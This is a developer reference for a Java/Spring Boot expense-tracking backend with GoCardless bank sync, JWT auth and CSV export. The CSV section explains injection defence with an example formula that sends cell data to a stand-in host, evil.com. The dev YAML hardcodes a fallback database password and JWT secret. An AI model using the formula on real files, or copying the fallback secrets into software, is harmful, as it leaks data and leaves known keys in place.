# Expense Tracking — Backend Technical Reference

> **Audience:** Developers, code reviewers, technical leads
> **Last Updated:** 2026-04-09
> **Stack:** Java 21 · Spring Boot 3.5.9 · PostgreSQL 16 · Maven · Flyway · JWT · GoCardless API · Lombok · Apache Commons CSV

---

## Table of Contents

1. [Architecture](#architecture)
2. [Project Structure](#project-structure)
3. [Database Migrations](#database-migrations)
4. [Authentication & Security](#authentication--security)
5. [Transaction Management](#transaction-management)
6. [Category Management](#category-management)
7. [Bank Integration (GoCardless)](#bank-integration-gocardless)
8. [Background Scheduler](#background-scheduler)
9. [Database Schema](#database-schema)
10. [Data Flow Diagrams](#data-flow-diagrams)
11. [Configuration Reference](#configuration-reference)
12. [Error Handling](#error-handling)

---

## Architecture

```
┌────────────────────┐      ┌──────────────────────────────────────┐
│  React SPA (Vite)  │      │           Spring Boot App             │
│                    │ JWT  │  Controller ──▶ Service ──▶ Repo   │
│  App.jsx           │─────▶│       │                    │        │
│  ├── AuthContext   │◀─────│       ▼                    ▼        │
│  ├── AppLayout     │ JSON │  DTOs/Validation      PostgreSQL    │
│  └── Pages         │      │                                      │
│  port 5173        │      │  ┌──────────────────────────────┐   │
└────────────────────┘      │  │ TransactionSyncScheduler      │   │
                            │  │ @Scheduled every 15 min    │   │
                            │  └──────────┬─────────────────┘   │
                            │             ▼                      │
                            └──────────── GoCardlessService ────▶ GoCardless API
```

### Why These Technologies?

| Choice | Why |
|--------|-----|
| **Java 21** | Modern LTS, records/pattern matching reduce boilerplate, ZGC for low-latency GC |
| **Spring Boot 3** | Auto-config, `@Transactional`, `@Scheduled`, `@RestControllerAdvice` — less glue code |
| **PostgreSQL 16** | JSONB support, strong consistency, `deferrable unique` constraints for dedup |
| **Flyway** | Schema versioned as SQL files, migrations run automatically on startup |
| **JWT (jjwt)** | Stateless auth — no server-side session storage, scales horizontally |
| **BCrypt** | Adaptive cost factor (work factor), resistant to rainbow table / GPU attacks |
| **Lombok** | Eliminates getters/setters/constructors, keeps entity files readable |
| **Apache Commons CSV** | RFC-4180 compliant, streaming-friendly, no extra dependencies |
| **GoCardless API** | PSD2-compliant, covers 2,500+ EU/UK banks, single API for all countries |
| **GoCardless REST over WebClient** | No SDK needed — simpler dependency management, full control over HTTP |

### Layer Responsibilities

| Layer | Responsibility | Key Pattern |
|-------|---------------|-------------|
| Controller | REST endpoints, validation, extract user | `@RestController`, `@AuthenticationPrincipal` |
| Service | Business logic, ownership checks, mapping | `@Service`, `@Transactional` |
| Repository | Data access, custom JPQL queries | `JpaRepository` |
| Config | Beans, external credentials, security | `@Configuration` |
| Scheduler | Background tasks, toggled via property | `@Scheduled`, `@ConditionalOnProperty` |

---

## Project Structure

```
src/main/java/com/example/expense_tracking/
├── config/
│   ├── ApplicationConfig.java        # BCrypt encoder, AuthenticationManager, UserDetailsService
│   ├── SecurityConfig.java          # CORS, stateless session, JWT filter chain, public endpoints
│   ├── JwtAuthenticationFilter.java # Token extraction, validation, lastActiveAt tracking
│   ├── GoCardlessConfig.java       # API credentials + RestTemplate bean
│   └── SyncConfig.java             # Scheduler settings (interval, lookback, active-user-days)

├── controller/
│   ├── AuthController.java         # POST /api/auth/register, /login
│   ├── UserController.java          # GET/PUT /api/user/profile, PUT /change-password
│   ├── TransactionController.java   # CRUD, dashboard, category-summary, export
│   ├── CategoryController.java      # CRUD /api/categories
│   └── BankController.java          # institutions, link, callback, sync, unlink, sync-history

├── dto/
│   ├── Auth: LoginRequest, LoginResponse, RegisterRequest
│   ├── User: UpdateProfileRequest, ChangePasswordRequest, UserProfileResponse
│   ├── Transaction: TransactionRequest, TransactionResponse, DashBoardResponse, CategorySummaryResponse
│   ├── Category: CategoryRequest, CategoryDTO, SyncLogResponse
│   ├── bank/: LinkBankRequest/Response, BankAccountResponse, SyncRequest/Response, CallbackResponse
│   └── gocardless/: GCInstitution, GCRequisitionRequest/Response, GCTokenResponse,
│       GCAccountDetails, GCAccountDetailsWrapper, GCAccountReference,
│       GCTransaction, GCTransactionAmount, GCTransactionResponse

├── entity/
│   ├── User.java                   # implements UserDetails (Spring Security)
│   ├── Transaction.java             # UNIQUE(bank_transaction_id, bank_config_id)
│   ├── Category.java               # per-user, typed IN/OUT, UNIQUE(user_id, name)
│   ├── TransactionType.java        # enum: IN, OUT
│   ├── BankConfig.java            # bank connection + state machine
│   └── SyncLog.java              # sync audit trail

├── exception/
│   ├── BadRequestException.java    # HTTP 400
│   ├── ForbiddenException.java      # HTTP 403
│   ├── ResourceNotFoundException.java  # HTTP 404
│   ├── ConflictException.java       # HTTP 409
│   └── GlobalExceptionHandler.java  # @RestControllerAdvice — maps all above + validation

├── repository/
│   ├── UserRepository.java         # findByEmail, existsByEmail
│   ├── TransactionRepository.java   # filtered queries, SUM totals, dedup check, unlink, nullify category
│   ├── CategoryRepository.java     # findByNameAndUser, findByUser, findByIdAndUser
│   ├── BankConfigRepository.java   # findByStatus, findByUser, findByIdAndUser, findByLinkReference
│   └── SyncLogRepository.java      # findByBankConfigOrderBySyncedAtDesc

├── scheduler/
│   └── TransactionSyncScheduler.java  # @Scheduled background sync

├── service/
│   ├── AuthService.java           # BCrypt register, JWT login
│   ├── UserService.java           # Profile update, password change
│   ├── TransactionService.java     # CRUD, dashboard stats, CSV export + sanitization, auto-create categories
│   ├── CategoryService.java       # CRUD, conflict detection, safe deletion (nullifies transactions first)
│   ├── GoCardlessService.java    # GoCardless REST client, token caching (AtomicReference + synchronized)
│   ├── BankLinkingService.java   # requisition creation, callback processing, multi-account linking, IBAN masking
│   └── TransactionSyncService.java # initial sync (90d), incremental sync (3d), dedup, expiry detection

└── utils/
    └── JwtUtils.java              # HS256 generate, extract claims, validate expiration
```

---

## Database Migrations

Flyway runs migrations on startup. JPA `ddl-auto: validate` — Flyway owns the schema.

| File | What It Does |
|------|-------------|
| `V1__Init_database.sql` | `users`, `transactions`, `categories`, `bank_configs` (old Casso schema), `webhook_logs` |
| `V2__GoCardless_Migration.sql` | Drop Casso columns, add GoCardless columns (`institution_id`, `requisition_id`, `gocardless_account_id`, `iban`, `status`, etc.), create `sync_logs` |
| `V3__Adjust_bank_configs_And_users.sql` | Further bank_config adjustments, add `last_active_at` to users, add indexes |
| `V4__Add_link_reference_to_bank_configs.sql` | Add `link_reference` (UUID) column — secures the callback |
| `V5__Add_category_unique_constraint.sql` | Deduplicate existing categories per user, add `UNIQUE(user_id, name)` |

---

## Authentication & Security

### JWT Authentication Flow

```
POST /api/auth/register
  → Validate unique email (409 if duplicate)
  → BCrypt hash password (cost factor from encoder)
  → Save User entity
  → Return success message

POST /api/auth/login
  → Find user by email
  → BCrypt.matches(password, hash)
  → JwtUtils.generateToken(user)  [HS256, 24h, claims: email + fullName]
  → Return { token, fullName }

Every subsequent request:
  → JwtAuthenticationFilter.doFilterInternal()
  → Extract "Bearer <token>" from Authorization header
  → Load UserDetails from DB via UserDetailsService
  → Validate signature + expiration
  → Set SecurityContext → request is now authenticated
  → Update lastActiveAt (throttled: max once per hour per user)
```

### Why JWT?

| Reason | Explanation |
|--------|------------|
| **Stateless** | No server-side session store needed — the token IS the session |
| **Scalable** | Any backend instance can validate the token; no sticky sessions |
| **Portable** | Same token works for mobile, web, third-party integrations |
| **24h expiry** | Short enough to limit exposure if token leaks |

### Why BCrypt over SHA-256 / MD5?

BCrypt is **adaptive** — the work factor can be increased as hardware gets faster. MD5 and SHA-256 are fast by design (good for hashing large files, bad for passwords). A bcrypt hash of a weak password takes milliseconds to compute but years to brute-force.

### Security Configuration

```java
SecurityConfig.java
  .requestMatchers("/api/auth/**").permitAll()       // register, login
  .requestMatchers("/api/banks/callback").permitAll() // GoCardless redirect (no JWT available)
  .anyRequest().authenticated()                      // everything else needs JWT
  .csrf(AbstractHttpConfigurer::disable)              // REST — no session cookies
  .sessionManagement(session -> STATELESS)            // No HttpSession used
```

- **Callback is public** because GoCardless redirects the browser — no JWT cookie is sent
- **UUID reference** in `link_reference` column prevents guessing active linking sessions
- **User enumeration prevented**: both "email not found" and "wrong password" return the same error message

### `@AuthenticationPrincipal` vs `SecurityContextHolder`

```java
// Before (manual extraction)
User user = (User) SecurityContextHolder.getContext().getAuthentication().getPrincipal();

// After (cleaner, tested)
@GetMapping("/profile")
public ResponseEntity<UserProfileResponse> getProfile(@AuthenticationPrincipal User user) {
    return ResponseEntity.ok(userService.getProfile(user));
}
```

Spring resolves `@AuthenticationPrincipal` from the `SecurityContext` automatically. No cast needed, works with any `AuthenticationPrincipalResolver`.

---

## Transaction Management

### Endpoints

| Endpoint | Method | Output |
|----------|--------|--------|
| `/api/transactions` | POST | `TransactionResponse` |
| `/api/transactions` | GET `?page&size&category&startDate&endDate` | `Page<TransactionResponse>` |
| `/api/transactions/{id}` | PUT | `TransactionResponse` |
| `/api/transactions/{id}` | DELETE | 204 No Content |
| `/api/transactions/dashboard` | GET | `DashBoardResponse` |
| `/api/transactions/category-summary` | GET | `List<CategorySummaryResponse>` |
| `/api/transactions/export` | GET `?category&startDate&endDate` | CSV file download |

### Why `Page<TransactionResponse>` and not `List<Transaction>`?

Returning a `Page` gives the frontend:
- **Content** — the actual transactions
- **Metadata** — `totalElements`, `totalPages`, `number`, `size` for pagination controls

Returning a `List` would require the frontend to count the size manually or make assumptions about the page size.

### TransactionRequest Validation

```java
@Data
public class TransactionRequest {
    @NotNull(message = "Category name cannot be empty")
    private String category;       // auto-creates if new for this user

    @NotNull @Positive(message = "Amount must be greater than zero")
    private BigDecimal amount;     // BigDecimal — never float or double

    @NotNull(message = "Type is required (IN/OUT)")
    private TransactionType type;  // IN (income) or OUT (expense)

    private String description;    // optional
    private LocalDateTime transactionDate;  // optional, defaults to LocalDateTime.now()
    private Long bankConfigId;     // optional — links to bank account
}
```

### Why `BigDecimal` for money?

`float` and `double` are **binary floating-point** — `0.1 + 0.2 != 0.3`. `BigDecimal` uses decimal arithmetic and gives exact results for financial calculations.

### Auto-Create Category Logic

```java
Category category = categoryRepository.findByNameAndUser(name, user)
    .orElseGet(() -> {
        // First time user types "Food" → create it automatically
        return categoryRepository.save(Category.builder()
            .name(name).type(request.getType()).user(user).build());
    });
```

Users don't need to pre-create categories — they type a name when adding a transaction and it is created on first use. This reduces friction but risks typos creating duplicate categories → `V5__Add_category_unique_constraint.sql` adds `UNIQUE(user_id, name)` to prevent this.

### Bank / Cash Switch Logic (Update)

| `bankConfigId` sent | Result |
|--------------------|--------|
| `null` (omitted) | Keep existing bank/cash assignment — **do nothing** |
| `<= 0` (e.g. `0` or `-1`) | Explicitly switch to cash — `setBankConfig(null)` |
| `> 0` | Switch to that bank account — verify ownership first |

Why this design? A user may update only the description or amount and not think about the bank field. Omitting it preserves their intent rather than accidentally resetting to cash.

### CSV Export

```java
// Max 100,000 rows to prevent OOM
Page<Transaction> page = transactionRepository.findFilteredTransactions(user, filter, pageable);
List<Transaction> transactions = page.getContent();

// CSV injection prevention
private String sanitizeCsvValue(String value) {
    if (value == null) return "";
    if (value.startsWith("=") || value.startsWith("+") ||
        value.startsWith("-") || value.startsWith("@") ||
        value.startsWith("\t") || value.startsWith("\r"))
        return "'" + value;  // Prefix dangerous chars with single quote
    return value;
}
```

Why sanitize? A CSV cell starting with `=` executes as a formula in Excel/Google Sheets. An attacker who can write to your transactions could inject `=HYPERLINK("evil.com?data="&A1)` and trick a reviewer into opening a malicious link.

---

## Category Management

### Endpoints

| Endpoint | Method | Description |
|---------|--------|-------------|
| `/api/categories` | GET | List user's categories |
| `/api/categories` | POST | Create category |
| `/api/categories/{id}` | PUT | Update category |
| `/api/categories/{id}` | DELETE | Delete category |

### Why delete nullifies transactions first?

```java
// CategoryService.deleteCategory()
transactionRepository.nullifyCategoryOnTransactions(category);  // SET category_id = NULL
categoryRepository.delete(category);
```

If a category is deleted without nullifying, the foreign key constraint on `transactions.category_id` would either reject the delete or cascade-delete all transactions. Neither is desirable — the transactions should survive the category's deletion.

---

## Bank Integration (GoCardless)

### Why GoCardless over Casso?

| Casso | GoCardless |
|-------|-----------|
| Vietnam-only | 2,500+ banks across 31 EU/UK countries |
| Push (webhook) | Pull (scheduled fetch) |
| Casso app required | No app — direct Open Banking |
| Custom webhook format | Standard PSD2 API |
| Region-limited | Works from any EU/UK-connected location |

GoCardless uses **PSD2** (Payment Services Directive 2), a European regulation that mandates banks provide open APIs for third-party providers. This means legal, stable access to bank transactions across the EU without bank-specific integrations.

### GoCardless API Integration

`GoCardlessService.java` — REST client using `RestTemplate`

| Method | Endpoint | Purpose |
|--------|----------|---------|
| `getAccessToken()` | `POST /api/v2/token/new/` | OAuth token — **cached in memory**, refreshed when < 60s from expiry |
| `getInstitutions()` | `GET /api/v2/institutions/?country=` | List available banks |
| `createRequisition()` | `POST /api/v2/requisitions/` | Start linking session |
| `getRequisition()` | `GET /api/v2/requisitions/{id}/` | Check linking status + account IDs |
| `getAccountDetails()` | `GET /api/v2/accounts/{id}/details/` | IBAN, owner name |
| `getTransactions()` | `GET /api/v2/accounts/{id}/transactions/` | Fetch transactions by date range |

### Token Caching

```java
private final AtomicReference<String> accessToken = new AtomicReference<>();
private final AtomicReference<Instant> tokenExpiresAt = new AtomicReference<>();

public synchronized String getAccessToken() {
    String token = accessToken.get();
    Instant expiresAt = tokenExpiresAt.get();
    if (token != null && expiresAt != null
            && Instant.now().isBefore(expiresAt.minusSeconds(60))) {
        return token;  // Still valid for at least 60s — reuse it
    }
    // Expired or missing — fetch new token
    ...
}
```

**Why `AtomicReference` + `synchronized`?** Without it, two concurrent requests could both see an expired token and each spawn a new token request. The `synchronized` keyword serializes access, and `AtomicReference` provides lock-free reads by other threads.

**Why not a library like `okhttp`?** Spring's `RestTemplate` is already available — no extra dependency needed for a simple REST client.

### Bank Linking Flow

```
1. POST /api/banks/link { institutionId: "REVOLUT_REVOGB21" }
   → Generate UUID reference → save BankConfig (status=PENDING)
   → Call GoCardless → createRequisition() → get redirect URL
   → Return { link, requisitionId, institutionName }

2. User's browser → redirects to GoCardless → authenticates with bank

3. GoCardless → GET /api/banks/callback?ref={UUID}
   → Find PENDING BankConfig by UUID reference
   → getRequisition() → check status="LN" (linked)
   → For each account:
       → getAccountDetails() → extract IBAN + ownerName
       → Update BankConfig (status=LINKED, accessExpiresAt=now+90d)
       → initialSync() → fetch 90 days of transactions
   → Return SUCCESS response (shown to user in browser)
```

### Why UUID as the callback reference?

GoCardless redirects to `/callback?ref={UUID}`. The UUID is stored in `link_reference` column. Without it, the callback would need to contain the user's ID (a secret in a URL) or a session token. UUIDs are unpredictable enough that an attacker cannot guess a valid linking session.

### BankConfig Status State Machine

```
PENDING ──▶ LINKED ──▶ EXPIRED
               │
               └──▶ ERROR
```

| Status | Meaning | How It Gets Here |
|--------|---------|----------------|
| PENDING | Linking started, not yet authorized | Set on POST /link |
| LINKED | Bank authorized, actively syncing | Set on callback with status=LN |
| EXPIRED | Bank consent expired (90–180 days) | Scheduler detects via `accessExpiresAt` |
| ERROR | Authorization rejected or API failure | Set on callback with status=RJ/EX |

### Deduplication

Two layers prevent duplicate imports:

1. **Application**: `existsByBankTransactionIdAndBankConfig()` check before saving
2. **Database**: `UNIQUE(bank_transaction_id, bank_config_id)` constraint

Even if two concurrent sync jobs run or a transaction ID changes format, the DB constraint is the final backstop.

### Unlink Behavior

```java
@Transactional
public boolean unlinkBank(User user, Long bankConfigId) {
    transactionRepository.unlinkTransactionsFromBankConfig(bankConfig);  // SET bankConfig_id = NULL
    bankConfigRepository.deleteById(bankConfigId);                     // Now safe to delete
}
```

Transactions are **preserved** — only the bank link is removed. `bankConfig_id` is nullable, so the transaction row stays intact.

---

## Background Scheduler

```java
@Component
@ConditionalOnProperty(name = "sync.enabled", havingValue = "true", matchIfMissing = true)
public class TransactionSyncScheduler {
    @Scheduled(
        fixedRateString = "#{${sync.interval-minutes:15} * 60 * 1000}",
        initialDelayString = "#{${sync.interval-minutes:15} * 60 * 1000}"  // Wait one full interval before first run
    )
    public void scheduledSync() { transactionSyncService.syncAllActiveAccounts(); }
}
```

**Why `initialDelay = fixedRate`?** Running immediately on startup would cause a spike of GoCardless API calls the moment the app starts — before it's warmed up, before any health checks pass.

**Why `@ConditionalOnProperty`?** Allows disabling the scheduler in dev environments where you don't want background jobs running.

**Why `@Transactional` on service methods?** Each sync step (fetch → dedup → save) should be atomic. If the app crashes mid-sync, the partial state is rolled back.

---

## Database Schema

```
users ──1:N── transactions    users ──1:N── categories    users ──1:N── bank_configs
         │                         │
         └─── nullable FK          └─── nullable FK          ──1:N── sync_logs
         (cash txns)              (orphaned txns preserved)
```

```
users
  id BIGSERIAL PK
  email VARCHAR UNIQUE NOT NULL
  password_hash VARCHAR NOT NULL     -- BCrypt hash
  full_name VARCHAR
  is_active BOOLEAN DEFAULT TRUE
  last_active_at TIMESTAMP          -- for sync activity filter
  created_at TIMESTAMP DEFAULT NOW()

categories
  id BIGSERIAL PK
  user_id BIGINT FK → users(id)
  name VARCHAR NOT NULL
  type VARCHAR(20) NOT NULL CHECK IN('IN','OUT')
  icon VARCHAR
  created_at TIMESTAMP
  UNIQUE(user_id, name)             -- V5: prevents duplicates per user

bank_configs
  id BIGSERIAL PK
  user_id BIGINT FK → users(id)
  institution_id / _name / _logo VARCHAR
  requisition_id VARCHAR
  link_reference VARCHAR UNIQUE      -- UUID for callback (V4)
  gocardless_account_id VARCHAR UNIQUE
  iban / account_name / status VARCHAR
  access_expires_at TIMESTAMP
  last_synced_at TIMESTAMP
  created_at TIMESTAMP

transactions
  id BIGSERIAL PK
  user_id BIGINT FK → users(id)
  bank_config_id BIGINT FK → bank_configs(id)  -- nullable (cash)
  category_id BIGINT FK → categories(id)        -- nullable
  amount DECIMAL(19,2) NOT NULL
  currency VARCHAR(3) DEFAULT 'GBP'
  description TEXT
  transaction_date TIMESTAMP NOT NULL
  type VARCHAR(20) NOT NULL CHECK IN('IN','OUT')
  bank_transaction_id VARCHAR         -- for dedup
  UNIQUE(bank_transaction_id, bank_config_id)     -- V2: prevents duplicates
  created_at TIMESTAMP

sync_logs
  id BIGSERIAL PK
  bank_config_id BIGINT FK → bank_configs(id)
  synced_at TIMESTAMP
  date_from / date_to DATE
  transactions_fetched / transactions_new INT
  status VARCHAR NOT NULL
  error_message TEXT
  created_at TIMESTAMP
```

### Key Relationships

| Relationship | Type | Meaning |
|-------------|------|--------|
| users → transactions | 1:N | A user owns many transactions |
| users → categories | 1:N | Each user's categories are isolated |
| users → bank_configs | 1:N | A user can link multiple banks |
| bank_configs → sync_logs | 1:N | Every sync attempt is logged |
| bank_configs → transactions | 1:N nullable | Cash transactions have no bank |
| categories → transactions | 1:N nullable | Deleted categories nullify, don't cascade |

---

## Data Flow Diagrams

### Manual Transaction Creation

```
POST /api/transactions
  → JwtAuthenticationFilter (resolves User from JWT)
  → TransactionController.createTransaction(@AuthenticationPrincipal User user)
  → TransactionService.createTransaction(request, user)
    1. transactionDate: use provided or default to now
    2. Find or create Category (findByNameAndUser + orElseGet save)
    3. bankConfigId: if present, verify user ownership → throw ForbiddenException
    4. Generate ID: "MANUAL_" + UUID.randomUUID()
    5. Save Transaction
  → Return TransactionResponse (entity → DTO mapping in service layer)
```

### Background Sync

```
Every 15 minutes (after initial delay):
  TransactionSyncScheduler.scheduledSync()
    → TransactionSyncService.syncAllActiveAccounts()
      → BankConfigRepository.findByStatus("LINKED")
      → For each BankConfig:
        → isUserActive(user)? lastActiveAt > 30 days → skip
        → checkAndUpdateExpiredAccess()? accessExpiresAt passed → set EXPIRED → skip
        → GoCardlessService.getTransactions(accountId, now-3d, now)
        → For each booked transaction:
            → existsByBankTransactionIdAndBankConfig()? → skip (duplicate)
            → mapToTransaction() + save
        → Update lastSyncedAt + createSyncLog
      → Log: "Batch sync: Success=X, Skipped=Y, Failed=Z"
```

---

## Configuration Reference

### application.yaml (dev defaults)

```yaml
spring:
  datasource:
    url: jdbc:postgresql://localhost:5433/postgres
    username: ${DB_USERNAME:postgres}
    password: ${DB_PASSWORD:MinhHieu2816@}       # dev fallback only
  jpa:
    hibernate: { ddl-auto: validate }            # Flyway owns schema
    show-sql: true
    properties: { hibernate: { format_sql: true } }
  flyway:
    enabled: true
    baseline-on-migrate: true
    locations: classpath:db/migration

jwt:
  secret: ${JWT_SECRET:MySuperStrongSuperLongSecretKeyForSecurity2806}  # env override required in prod
  expiration: 86400000  # 24 hours in ms

gocardless:
  secret-id: ${GOCARDLESS_SECRET_ID:your-secret-id-here}
  secret-key: ${GOCARDLESS_SECRET_KEY:your-secret-key-here}
  base-url: https://bankaccountdata.gocardless.com
  redirect-url: ${APP_BASE_URL:http://localhost:8080}/api/banks/callback

sync:
  enabled: true
  interval-minutes: 15          # How often to sync
  look-back-days: 3             # Incremental sync window (fetches last 3 days)
  active-user-days: 30           # Skip sync if user inactive > 30 days
  initial-sync-days: 90          # History depth on first link
```

### application-prod.yaml (overrides for production)

```yaml
spring:
  datasource:
    url: ${DB_URL}               # No fallback — must be set via env
    username: ${DB_USERNAME}     # No fallback
    password: ${DB_PASSWORD}     # No fallback
  jpa:
    show-sql: false
    properties: { hibernate: { format_sql: false } }
jwt:
  secret: ${JWT_SECRET}          # No fallback — must be set via env
logging:
  level: { root: WARN, com.example.expense_tracking: INFO }
```

### Environment Variables

| Variable | Required | Purpose |
|----------|----------|---------|
| `DB_URL` | Prod | PostgreSQL JDBC URL |
| `DB_USERNAME` | Prod | Database user |
| `DB_PASSWORD` | Prod | Database password |
| `JWT_SECRET` | Prod | HS256 signing key (min 256-bit recommended) |
| `GOCARDLESS_SECRET_ID` | Bank features | GoCardless API credential |
| `GOCARDLESS_SECRET_KEY` | Bank features | GoCardless API credential |
| `APP_BASE_URL` | Bank features | Public base URL for GoCardless callback |

---

## Error Handling

### GlobalExceptionHandler

```java
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<Map<String, String>>  // 400 — field errors
    public ResponseEntity<Map<String, String>>  // 400 — BadRequestException
    public ResponseEntity<Map<String, String>>  // 403 — ForbiddenException
    public ResponseEntity<Map<String, String>>  // 404 — ResourceNotFoundException
    public ResponseEntity<Map<String, String>>  // 409 — ConflictException
    public ResponseEntity<Map<String, String>>  // 500 — RuntimeException (catch-all)
}
```

### Why Custom Exceptions Over RuntimeException?

`RuntimeException` defaults to HTTP 500 (Internal Server Error), which tells clients "something went wrong on the server." Custom exceptions map to the **correct HTTP status** so API consumers can handle each case appropriately:

- 400 Bad Request → user submitted bad data
- 403 Forbidden → user is authenticated but not authorized
- 404 Not Found → resource doesn't exist
- 409 Conflict → user's action conflicts with existing state

### Error Response Format

```json
// Field validation error (400)
{ "email": "Invalid email format", "password": "Password must be at least 8 characters" }

// Business error (all others)
{ "error": "You do not own this transaction" }
```

### Ownership Verification Pattern

```java
// Every mutating service method verifies ownership:
if (!entity.getUser().getId().equals(user.getId())) {
    throw new ForbiddenException("You do not own this resource");
}
```

This is enforced at the **service layer**, not the controller, so it applies to all callers (REST API, future CLI, tests, etc.).
